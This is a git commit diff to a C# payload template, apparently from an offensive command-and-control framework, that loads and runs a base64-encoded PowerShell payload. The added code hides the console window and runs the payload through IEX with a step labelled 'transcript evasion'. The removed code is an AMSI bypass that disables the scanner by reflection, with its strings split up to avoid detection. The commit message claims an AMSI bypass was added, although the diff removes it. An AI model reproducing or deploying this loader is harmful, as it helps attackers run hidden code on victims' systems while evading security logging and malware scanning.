b6bbea89ee516f90c99a79eab252bad4145ae7c7
benpturner <2518196+benpturner@users.noreply.github.com>
2020-07-28 17:48:59 +0100

    Added Smaller Shellcode / AMSI-Bypass

--- resources/payload-templates/Sharp_Powershell_Runner.cs
+++ resources/payload-templates/Sharp_Powershell_Runner.cs
@@ -8,62 +8,63 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 
 public class Program
+{
+    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    
+    public const int SW_HIDE = 0;
+    public const int SW_SHOW = 5;
+    public static string basepayload = "#REPLACEME#";
+    
+    public Program() {
+        try
+        {
+            string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(basepayload));
+            InvokeAutomation(tt);
+        }
+        catch
+        {
+            Main();
+        }
+    }
+    public static string InvokeAutomation(string cmd)
     {
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        public const int SW_HIDE = 0;
-        public const int SW_SHOW = 5;
-        public static string p = "#REPLACEME#";
-        public Program() {
-            try
-            {
-                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(p));
-                InvokeAutomation(tt);
-            }
-            catch
-            {
-                Main();
-            }
-        }
-        public static string InvokeAutomation(string cmd)
-        {
-            Runspace newrunspace = RunspaceFactory.CreateRunspace();
-            newrunspace.Open();
-            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
-            try
-            {
-                var amsi = scriptInvoker.GetType().Assembly.GetType("Syste" + "m.Management.Autom" + "ation.Ams" + "iUtils");
-                var amsifield = amsi.GetField("am" + "siIni" + "tFailed", BindingFlags.NonPublic | BindingFlags.Static);
-                amsifield.SetValue(null, true);
-            } catch { }
-            Pipeline pipeline = newrunspace.CreatePipeline();
+        Runspace newrunspace = RunspaceFactory.CreateRunspace();
+        newrunspace.Open();
 
-            pipeline.Commands.AddScript(cmd);
-            Collection<PSObject> results = pipeline.Invoke();
-            newrunspace.Close();
+        // transcript evasion
+        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
+        var cmdin = new System.Management.Automation.PSVariable("c");
+        newrunspace.SessionStateProxy.PSVariable.Set(cmdin);
+        var output = new System.Management.Automation.PSVariable("o");
+        newrunspace.SessionStateProxy.PSVariable.Set(output);
 
-            StringBuilder stringBuilder = new StringBuilder();
-            foreach (PSObject obj in results)
-            {
-                stringBuilder.Append(obj);
-            }
-            return stringBuilder.ToString().Trim();
-        }
-        public static void Main()
+        Pipeline pipeline = newrunspace.CreatePipeline();
+        newrunspace.SessionStateProxy.SetVariable("c", cmd);
+        pipeline.Commands.AddScript("$o = IEX $c | Out-String");
+        Collection<PSObject> results = pipeline.Invoke();
+        newrunspace.Close();
+
+        StringBuilder stringBuilder = new StringBuilder();
+        foreach (PSObject obj in results)
         {
-            var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE);
-            try
-            {
-                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(p));
-                InvokeAutomation(tt);
-            }
-            catch
-            {
-                Main();
-            }
+            stringBuilder.Append(obj);
         }
-        
+        return stringBuilder.ToString().Trim();
+    }
+    public static void Sharp()
+    {
+        var handle = GetConsoleWindow();
+        ShowWindow(handle, SW_HIDE);
+        try
+        {
+            string cmd = Encoding.UTF8.GetString(System.Convert.FromBase64String(basepayload));
+            InvokeAutomation(cmd);
+        }
+        catch { }
+    }
+    public static void Main()
+    {
+        Sharp();
+    }
 }
